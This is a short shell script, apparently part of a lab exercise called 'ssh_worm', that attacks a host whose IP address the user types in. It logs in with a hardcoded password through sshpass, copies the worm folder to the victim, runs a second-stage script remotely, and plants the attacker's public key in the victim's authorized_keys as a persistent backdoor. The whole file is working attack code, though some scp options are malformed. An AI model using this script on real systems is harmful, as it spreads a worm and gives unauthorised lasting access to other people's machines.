# task3
# input victim's IP address
export SSHPASS='victim'

read -p "Enter Victim IP Address: " IP_Address
sshpass -e scp -r ../ssh_worm victim@"$IP_Address":/home/victim/Desktop/
sshpass -e ssh victim@"$IP_Address" 'cd /home/victim/Desktop/ssh_worm && ./task2.sh'

# publickey
SSH_PATH="/home/victim/.ssh"

ssh-keygen

sshpass -e scp "StrictHostKeyChecking=no" /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
sshpass -e scp "StrictHostKeyChecking=no" /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
#####
ssh victim@"$IP_Address"